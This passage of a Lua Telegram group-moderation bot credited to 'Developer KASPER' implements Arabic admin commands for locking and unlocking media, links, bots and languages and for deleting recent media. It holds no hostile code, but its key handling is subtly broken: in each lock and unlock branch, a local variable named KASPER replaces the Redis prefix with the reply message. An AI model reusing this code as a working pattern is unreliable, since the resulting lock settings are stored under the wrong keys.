KASPERddx2 = '\n*✟︙تم مسح ⌯» { '..q..' } مجموعه من البوت*' 
end
if w == 0 then
KASPERddx1 = ''
else
KASPERddx1 = '\n*✟︙تم مسح ⌯» { '..w..' } كروب بسبب تنزيل البوت عضو*'
end
KASPERdx(msg.chat_id_, msg.id_, 1,'*✟︙عدد الكروبات الان ⌯» { '..#group..' }*'..KASPERddx1..''..KASPERddx2..'\n*✟︙العدد الحقيقي الان ⌯» ( '..KASPERdx3..' ) كروب*\n', 1, 'md')
end end end,nil) end
return false
end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text == "تنظيف ميديا" or text == "تنظيف الميديا" and KASPER11(msg) then   
KASPER = {[0]= msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
KASPER[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = KASPER},function(arg,data)
new = 0
KASPER2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and data.messages_[i].content_ and data.messages_[i].content_.ID ~= "MessageText" then
KASPER2[new] = data.messages_[i].id_
new = new + 1
end end
delete_msg(msg.chat_id_,KASPER2)
end,nil)  
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم تنظيف 100 من الميديا ،", 1, 'md')
end end
--     By Developer KASPER     -- 
if text and text:match("^اسم المجموعه$") and is_momod(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙اسم المجموعه {"..title_name(msg.chat_id_).."}", 1, 'md')
end 
--     By Developer KASPER     -- 
if text and text:match("^تنظيف الرسائل$") and is_sudo(msg) then
KASPERdx1:del(KASPER.."bot:allmsgs")
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تنظيف عدد رسائل الكروبات ', 'md')
end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^فتح (.*)$") and KASPER11(msg) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local unlockpts = {string.match(text, "^(فتح) (.*)$")}
if unlockpts[2] == "التعديل" then
if KASPERdx1:get(KASPER..'editmsg'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » التعديل  \n✟︙بواسطة ('..msg.sender_user_id_..') ' 
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'editmsg'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » التعديل سابقا ،', 1, 'md')
end end
if unlockpts[2] == "الفارسيه" then
if KASPERdx1:get(KASPER..'farsi'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الفارسيه  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 53, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'farsi'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الفارسيه سابقا ،', 1, 'md')
end end
if unlockpts[2] == "الفارسيه بالطرد" then
if KASPERdx1:get(KASPER..'farsiban'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الفارسيه بالطرد  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 60, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'farsiban'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الفارسيه بالطرد سابقا ،', 1, 'md')
end end
if unlockpts[2] == "الشارحه" then
if KASPERdx1:get(KASPER..'bot:cmds'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الشارحه  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:cmds'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الشارحه سابقا ،', 1, 'md')
end end
if unlockpts[2] == "البوتات" then
if KASPERdx1:get(KASPER..'bot:bots:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » البوتات  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:bots:mute'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » البوتات سابقا ،', 1, 'md')
end end
if unlockpts[2] == "البوتات بالطرد" then
if KASPERdx1:get(KASPER..'bot:bots:ban'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » البوتات بالطرد  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 59, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:bots:ban'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » البوتات بالطرد سابقا ،', 1, 'md')
end end
if unlockpts[2] == "البوتات بالتقييد" then
if KASPERdx1:get(KASPER..'keed_bots'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » البوتات بالتقييد  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 61, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'keed_bots'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » البوتات بالتقييد سابقا ،', 1, 'md')
end end
if unlockpts[2] == "التكرار" then
if KASPERdx1:get(KASPER..'anti-flood:'..msg.chat_id_) then 
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » التكرار  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'anti-flood:'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » التكرار سابقا ،', 1, 'md')
end end
if unlockpts[2] == "التثبيت" then
if KASPERdx1:get(KASPER..'bot:pin:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » التثبيت  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:pin:mute'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » التثبيت سابقا ،', 1, 'md')
end end end end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^قفل الكل بالساعات (%d+)$") and KASPER11(msg) then
local mutept = {string.match(text, "^قفل الكل بالساعات (%d+)$")}
local hour = string.gsub(mutept[1], 'h', '')
local num1 = tonumber(hour) * 3600
local num = tonumber(num1)
KASPERdx1:setex(KASPER..'bot:muteall'..msg.chat_id_, num, true)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم قفل الكل لمده "..mutept[1].." ساعه ،", 'md')
end end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^قفل (.*)$") and KASPER11(msg) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local mutepts = {string.match(text, "^(قفل) (.*)$")}
if mutepts[2] == "الدردشه" then
if not KASPERdx1:get(KASPER..'bot:text:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الدردشه  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:text:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الدردشه سابقا ،', 1, 'md')
end end
if mutepts[2] == "الاونلاين" then
if not KASPERdx1:get(KASPER..'bot:inline:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الاونلاين  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 54, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:inline:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الاونلاين سابقا ،', 1, 'md')
end end
if mutepts[2] == "الصور" then
if not KASPERdx1:get(KASPER..'bot:photo:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الصور  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 50, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:photo:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الصور سابقا ،', 1, 'md')
end end
if mutepts[2] == "الكلايش" then
if not KASPERdx1:get(KASPER..'bot:spam:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الكلايش  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:spam:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الكلايش سابقا ،', 1, 'md')
end end
if mutepts[2] == "الفيديو" then
if not KASPERdx1:get(KASPER..'bot:video:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الفيديو  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:video:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الفيديو سابقا ،', 1, 'md')
end end
if mutepts[2] == "المتحركه" then
if not KASPERdx1:get(KASPER..'bot:gifs:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » المتحركه  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 53, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:gifs:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » المتحركه سابقا ،', 1, 'md')
end end
if mutepts[2] == "الاغاني" then
if not KASPERdx1:get(KASPER..'bot:music:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الاغاني  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:music:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الاغاني سابقا ،', 1, 'md')
end end
if mutepts[2] == "الصوت" then
if not KASPERdx1:get(KASPER..'bot:voice:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الصوت  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 50, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:voice:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الصوت سابقا ،', 1, 'md')
end end
if mutepts[2] == "الروابط" then
if not KASPERdx1:get(KASPER..'bot:links:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الروابط  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:links:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الروابط سابقا ،', 1, 'md')
end end
if mutepts[2] == "المواقع" then
if not KASPERdx1:get(KASPER..'bot:location:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » المواقع  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:location:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » المواقع سابقا ،', 1, 'md')
end end
if mutepts[2] == "المعرف" then
if not KASPERdx1:get(KASPER..'tags:lock'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » المعرف  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 51, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'tags:lock'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » المعرف سابقا ،', 1, 'md')
end end
if  mutepts[2] == "الحمايه" then
if not KASPERdx1:get(KASPER..'bot:strict'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الحمايه  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:strict'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الحمايه سابقا ،', 1, 'md')
end end
if mutepts[2] == "الملفات" then
if not KASPERdx1:get(KASPER..'bot:document:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الملفات  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:document:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الملفات سابقا ،', 1, 'md')
end end
if mutepts[2] == "الهاشتاك" then
if not KASPERdx1:get(KASPER..'bot:hashtag:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الهاشتاك  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 53, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:hashtag:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الهاشتاك سابقا ،', 1, 'md')
end end
if mutepts[2] == "الجهات" then
if not KASPERdx1:get(KASPER..'bot:contact:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الجهات  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 51, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:contact:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الجهات سابقا ،', 1, 'md')
end end
if mutepts[2] == "الشبكات" then
if not KASPERdx1:get(KASPER..'bot:webpage:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الشبكات  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:webpage:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الشبكات سابقا ،', 1, 'md')
end end
if mutepts[2] == "العربيه" then
if not KASPERdx1:get(KASPER..'bot:arabic:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » العربيه  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:arabic:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » العربيه سابقا ،', 1, 'md')
end end
if mutepts[2] == "الانكليزيه" then
if not KASPERdx1:get(KASPER..'bot:english:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الانكليزيه  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 55, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:english:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الانكليزيه سابقا ،', 1, 'md')
end end
if mutepts[2] == "الملصقات" then
if not KASPERdx1:get(KASPER..'bot:sticker:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الملصقات  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 53, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:sticker:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الملصقات سابقا ،', 1, 'md')
end end
if mutepts[2] == "الماركداون" then
if not KASPERdx1:get(KASPER..'markdown:lock'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الماركداون  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 55, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'markdown:lock'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الماركداون سابقا ،', 1, 'md')
end end
if mutepts[2] == "الاشعارات" then
if not KASPERdx1:get(KASPER..'bot:tgservice:jk'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الاشعارات  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 54, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:tgservice:jk'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الاشعارات سابقا ،', 1, 'md')
end end
if mutepts[2] == "الفشار" then
if not KASPERdx1:get(KASPER.."fshar"..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الفشار  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 51, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER.."fshar"..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الفشار سابقا ،', 1, 'md')
end end
if mutepts[2] == "الطائفيه" then
if not KASPERdx1:get(KASPER.."taf"..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الطائفيه  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 53, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER.."taf"..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الطائفيه سابقا ،', 1, 'md')
end end
if mutepts[2] == "الكفران" then
if not KASPERdx1:get(KASPER.."kaf"..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الكفران  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER.."kaf"..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » الكفران سابقا ،', 1, 'md')
end end
if mutepts[2] == "التوجيه" then
if not KASPERdx1:get(KASPER..'bot:forward:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » التوجيه  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:forward:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل » التوجيه سابقا ،', 1, 'md')
end end end end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^فتح (.*)$") and KASPER11(msg) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local unmutepts = {string.match(text, "^(فتح) (.*)$")}
if unmutepts[2] == "الدردشه" then
if KASPERdx1:get(KASPER..'bot:text:mute'..msg.chat_id_) then 
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الدردشه  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:text:mute'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الدردشه سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الفشار" then
if KASPERdx1:get(KASPER.."fshar"..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الفشار  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 51, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER.."fshar"..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الفشار سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الطائفيه" then
if KASPERdx1:get(KASPER.."taf"..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الطائفيه  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 53, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER.."taf"..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الطائفيه سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الكفران" then
if KASPERdx1:get(KASPER.."kaf"..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الكفران  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER.."kaf"..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الكفران سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الصور" then
if KASPERdx1:get(KASPER..'bot:photo:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الصور  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 50, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:photo:mute'..msg.chat_id_)
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الصور سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الكلايش" then
if KASPERdx1:get(KASPER..'bot:spam:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الكلايش  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:spam:mute'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الكلايش سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الفيديو" then
if KASPERdx1:get(KASPER..'bot:video:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الفيديو  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:video:mute'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الفيديو سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الملفات" then
if KASPERdx1:get(KASPER..'bot:document:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الملفات  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:document:mute'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الملفات سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الاونلاين" then
if KASPERdx1:get(KASPER..'bot:inline:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الاونلاين  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 54, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'bot:inline:mute'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الاونلاين سابقا ،', 1, 'md')
end end
if unmutepts[2] == "الماركداون" then
if KASPERdx1:get(KASPER..'markdown:lock'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » الماركداون  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 55, string.len(msg.sender_user_id_))
KASPERdx1:del(KASPER..'markdown:lock'..msg.chat_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم فتح » الماركداون سابقا ،', 1, 'md')
end end
if unmutepts[2] == "المتحركه" then
if KASPERdx1:get(KASPER..'bot:gifs:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم فتح » المتحركه  \n✟︙بواسطة ('..msg.sender_user_id_..') '
